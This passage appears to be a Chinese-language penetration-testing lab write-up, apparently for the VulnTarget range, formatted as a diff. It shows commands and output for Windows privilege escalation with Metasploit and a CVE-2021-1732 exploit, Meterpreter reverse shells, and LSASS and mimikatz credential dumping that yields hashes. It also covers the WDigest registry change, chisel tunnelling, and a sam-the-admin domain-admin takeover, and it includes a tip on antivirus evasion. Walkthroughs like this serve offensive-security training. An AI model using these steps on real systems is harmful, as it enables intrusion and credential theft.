+ 12  exploit/windows/local/cve_2021_40449                           Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1909 build detected!
+ 13  exploit/windows/local/cve_2022_21882_win32k                    Yes                      The target appears to be vulnerable.
+ 14  exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
+ 15  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+ 16  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
+ 17  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
+ 18  exploit/windows/local/bypassuac_comhijack                      No                       The target is not exploitable.
+ 19  exploit/windows/local/bypassuac_eventvwr                       No                       The target is not exploitable.
+ 20  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
+ 21  exploit/windows/local/capcom_sys_exec                          No                       The target is not exploitable.
+ 22  exploit/windows/local/cve_2019_1458_wizardopium                No                       The target is not exploitable.
+ 23  exploit/windows/local/cve_2020_1054_drawiconex_lpe             No                       The target is not exploitable. No target for win32k.sys version 10.0.18362.387
+ 24  exploit/windows/local/cve_2021_21551_dbutil_memmove            No                       The target is not exploitable.
+ 25  exploit/windows/local/cve_2022_3699_lenovo_diagnostics_driver  No                       The target is not exploitable.
+ 26  exploit/windows/local/cve_2023_21768_afd_lpe                   No                       The target is not exploitable. The exploit only supports Windows 11 22H2
+ 27  exploit/windows/local/cve_2023_28252_clfs_driver               No                       The target is not exploitable.
+ 28  exploit/windows/local/cve_2024_30088_authz_basep               No                       The target is not exploitable. Version detected: Windows 10+ Build 18363
+ 29  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
+ 30  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
+ 31  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store
+ 32  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows 10 (10.0 Build 18363). is not vulnerable
+ 33  exploit/windows/local/ms14_058_track_popup_menu                No                       Cannot reliably check exploitability.
+ 34  exploit/windows/local/ms15_051_client_copy_image               No                       The target is not exploitable.
+ 35  exploit/windows/local/ms15_078_atmfd_bof                       No                       The target is not exploitable.
+ 36  exploit/windows/local/ms16_014_wmi_recv_notif                  No                       The target is not exploitable.
+ 37  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  No                       The target is not exploitable.
+ 38  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
+ 39  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
+ 40  exploit/windows/local/nvidia_nvsvc                             No                       The check raised an exception.
+ 41  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
+ 42  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
+ 43  exploit/windows/local/srclient_dll_hijacking                   No                       The target is not exploitable. Target is not Windows Server 2012.
+ 44  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.
+ 45  exploit/windows/local/virtual_box_opengl_escape                No                       The target is not exploitable.
+ 46  exploit/windows/local/webexec                                  No                       The check raised an exception.
+ 47  exploit/windows/local/win_error_cve_2023_36874                 No                       The target is not exploitable.
+```
+
+尝试进行自动化利用，但是失败
+
+```shell
+msf6 > use exploit/windows/local/cve_2022_21882_win32k
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/local/cve_2022_21882_win32k) > set lhost 0.0.0.0
+lhost => 0.0.0.0
+msf6 exploit(windows/local/cve_2022_21882_win32k) > set lport 4444
+lport => 4444
+msf6 exploit(windows/local/cve_2022_21882_win32k) > set session 5
+session => 5
+msf6 exploit(windows/local/cve_2022_21882_win32k) > exploit
+
+[*] Started reverse TCP handler on 0.0.0.0:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[*] Launching msiexec to host the DLL...
+[+] Process 1364 launched.
+[*] Reflectively injecting the DLL into 1364...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Exploit completed, but no session was created.
+```
+
+尝试手动 [linuxdy/CVE-2021-1732_exp](https://github.com/linuxdy/CVE-2021-1732_exp) 进行利用，记得使用 shelcode 进行免杀
+
+```shell
+meterpreter > shell
+Process 4348 created.
+Channel 1 created.
+Microsoft Windows [�汾 10.0.18363.418]
+(c) 2019 Microsoft Corporation����������Ȩ����
+
+C:\Users\Public>.\CVE-2021-1732_exploit.exe whoami
+.\CVE-2021-1732_exploit.exe whoami
+�밴���������. . .
+
+CreateWnd
+Hwnd:000200ba   qwfirstEntryDesktop=00000237C4B915B0
+BaseAddress:00000237C4B91000   RegionSize=:0000000000003000
+Hwnd:000200bc   qwfirstEntryDesktop=00000237C4B91770
+BaseAddress:00000237C4B91000   RegionSize=:0000000000003000
+Hwnd:000200b4   qwfirstEntryDesktop=00000237C4B93C80
+BaseAddress:00000237C4B93000   RegionSize=:0000000000001000
+Hwnd:000200f0   qwfirstEntryDesktop=00000237C4B93E20
+BaseAddress:00000237C4B93000   RegionSize=:0000000000001000
+Hwnd:000600d6   qwfirstEntryDesktop=00000237C4B93FE0
+BaseAddress:00000237C4B93000   RegionSize=:0000000000002000
+Hwnd:00050088   qwfirstEntryDesktop=00000237C4B941A0
+BaseAddress:00000237C4B94000   RegionSize=:0000000000001000
+Hwnd:00060064   qwfirstEntryDesktop=00000237C4B94360
+BaseAddress:00000237C4B94000   RegionSize=:0000000000001000
+Hwnd:00020094   qwfirstEntryDesktop=00000237C4B94520
+BaseAddress:00000237C4B94000   RegionSize=:0000000000001000
+Hwnd:00020096   qwfirstEntryDesktop=00000237C4B946E0
+BaseAddress:00000237C4B94000   RegionSize=:0000000000001000
+Hwnd:00020098   qwfirstEntryDesktop=00000237C4B948A0
+BaseAddress:00000237C4B94000   RegionSize=:0000000000001000
+Min BaseAddress:00000237C4B91000   RegionSize=:0000000000003000
+MagciHwnd==0000000000030098
+realMagicHwnd=0000000000030098
+dwRet=00000000000018E0
+tagWndMin_offset_0x128=00000000000018E0
+g_qwExpLoit=FFFFBDDF40822D20
+qwFrist read=FFFFBDDF40833BD0
+qwSecond read=FFFFDA8E02CF96A0
+qwSecond read=FFFFBDDF426E0000
+qwFourth read=FFFFBDDF428F0010
+qwFifth read=FFFFDA8E02BC7080
+qwSixth read=FFFFDA8E041EE0C0
+[*] Trying to execute whoami as SYSTEM
+[+] ProcessCreated with pid 5632!
+===============================
+nt authority\system
+
+�밴���������. . .
+```
+
+提权可行的话，直接上线 msf
+
+```shell
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 0.0.0.0:4444
+[*] Sending stage (203846 bytes) to 127.0.0.1
+[*] Meterpreter session 7 opened (127.0.0.1:4444 -> 127.0.0.1:37890) at 2025-02-03 21:04:05 +0800
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > sysinfo
+Computer        : WIN10
+OS              : Windows 10 (10.0 Build 18363).
+Architecture    : x64
+System Language : zh_CN
+Domain          : VULNTARGET
+Logged On Users : 7
+Meterpreter     : x64/windows
+```
+
+## win10 抓取域信息
+
+```shell
+meterpreter > run post/windows/gather/enum_domain
+
+[+] Domain FQDN: vulntarget.com
+[+] Domain NetBIOS Name: VULNTARGET
+[+] Domain Controller: WIN-UH20PRD3EAO.vulntarget.com (IP: 10.0.10.100)
+```
+
+直接抓取密码会失败
+
+```shell
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            (vincent.letoux@gmail.com)
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+meterpreter > creds_all
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username       Domain      NTLM                              SHA1
+--------       ------      ----                              ----
+Administrator  WIN10       579da618cfbfa85247acf1f800a280a4  39f572eceeaa2174e87750b52071582fc7f13118
+WIN10$         VULNTARGET  5d35b34708ecc51f89410a3b5e2189a3  bb9ee2d8ae83b56766f05625aa6bd8069cc51a3c
+
+wdigest credentials
+===================
+
+Username       Domain      Password
+--------       ------      --------
+(null)         (null)      (null)
+Administrator  WIN10       (null)
+WIN10$         VULNTARGET  (null)
+
+kerberos credentials
+====================
+
+Username       Domain          Password
+--------       ------          --------
+(null)         (null)          (null)
+Administrator  WIN10           (null)
+WIN10$         vulntarget.com  76 35 f7 b0 3b 4c bb a7 4c 3b 70 18 97 a7 0f eb ca 2f c3 63 27 48 a4 6e 8f 60 13 38 8b 8b 12 e1 69 e5 48 52 9f 9c 3b 11 41 0d 4c ed 96 a4 a0 9d c5 b5 0b 00 1c 71 4c 41 90 6e 6
+                               0 21 33 57 a1 c3 03 e1 83 4c 64 0e 45 8a ec d4 8a 32 8d 26 94 86 43 01 d2 8e 0b 7a a9 71 82 dd af cb 83 15 4c 5a 07 79 58 b9 a9 52 1b 90 d3 2e bc 90 87 12 cf 90 12 17 2d 44 1e
+                                81 19 df 8e 4c 69 1c 94 07 32 1c d2 6e 63 02 6f a8 3c a9 0f 9d 83 c8 e0 57 50 ba 56 09 5e eb 09 78 0a 31 cb 69 ff b2 6e 6c a6 92 5c d7 6b d0 a5 39 20 f0 0d ef 47 63 ae 3f 1e
+                               53 ae 2c 06 ea b4 7f e5 7d 00 06 7b 7e 45 42 2f 58 da df ea cc 28 18 de de cd 9e c8 ff 9b 91 ed 45 f6 08 87 56 39 46 ac a6 cd 87 9a e8 2e 9b d6 5b bb cd bb d9 c3 f8 1c a3 d7 0
+                               4 c8 71 0c 3e 5f 01
+win10$         VULNTARGET.COM  (null)
+```
+
+两种方案，一种是修改注册表之后重启，可以看到明文密码
+
+```plaintext
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+```
+
+另外一种，就是利用 [ProcDump - Sysinternals | Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) 抓取 LSASS 进程的内存，然后本地用mimikatz进行分析
+
+```shell
+# win10 capture memory
+.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+
+# analysis memory
+.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
+```
+
+即可得到域成员的凭据 `vulntarget.com/win101:admin#123`
+
+剩下一台内网域控，在二层内网
+
+## DC Impersonate DA
+
+先建立代理
+
+```shell
+# centos
+(remote) www@localhost.localdomain:/tmp$ ./chisel_1.9.1_linux_amd64 client 192.168.200.128:1337 0.0.0.0:1337:192.168.200.128:1337 &
+[4] 38751
+2025/02/03 21:19:29 client: Connecting to ws://192.168.200.128:1337
+2025/02/03 21:19:29 client: tun: proxy#1337=>192.168.200.128:1337: Listening
+2025/02/03 21:19:29 client: Connected (Latency 896.553µs)
+
+# win10
+C:\Users\Public>.\chisel_1.9.1_windows_amd6.exe client 10.0.20.30:1337 R:0.0.0.0:10001:socks
+2025/02/03 21:20:38 client: Connecting to ws://10.0.20.30:1337
+2025/02/03 21:20:38 client: Connected (Latency 1.9919ms)
+```
+
+尝试使用 [safebuffer/sam-the-admin: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user](https://github.com/safebuffer/sam-the-admin) 进行利用
+
+```shell
+┌──(randark㉿kali)-[~]
+└─$ proxychains python3 ./tools/sam-the-admin/sam_the_admin.py "vulntarget.com/win101:admin#123" -dc-ip 10.0.10.100 -shell       
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[proxychains] Strict chain  ...  127.0.0.1:10005  ...  10.0.10.100:389  ...  OK
+[-] WARNING: Target host is not a DC
+[*] Selected Target win-uh20prd3eao.vulntarget.com
+[*] Total Domain Admins 1
+[*] will try to impersonate Administrator
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Adding Computer Account "SAMTHEADMIN-55$"
+[*] MachineAccount "SAMTHEADMIN-55$" password = kXNCabfMO0H)
+[proxychains] Strict chain  ...  127.0.0.1:10005  ...  10.0.10.100:135  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:10005  ...  10.0.10.100:445  ...  OK
+[*] Successfully added machine account SAMTHEADMIN-55$ with password kXNCabfMO0H).
+[*] SAMTHEADMIN-55$ object = CN=SAMTHEADMIN-55,CN=Computers,DC=vulntarget,DC=com
+[*] SAMTHEADMIN-55$ sAMAccountName == win-uh20prd3eao
+[proxychains] Strict chain  ...  127.0.0.1:10005  ...  10.0.10.100:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:10005  ...  10.0.10.100:88  ...  OK
+[*] Saving ticket in win-uh20prd3eao.ccache
+[*] Resting the machine account to SAMTHEADMIN-55$
+[*] Restored SAMTHEADMIN-55$ sAMAccountName to original value
+[*] Using TGT from cache
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[proxychains] Strict chain  ...  127.0.0.1:10005  ...  10.0.10.100:88  ...  OK
+[*] Saving ticket in Administrator.ccache
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[proxychains] Strict chain  ...  127.0.0.1:10005  ...  10.0.10.100:445  ...  OK
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>whoami
+nt authority\system
+```
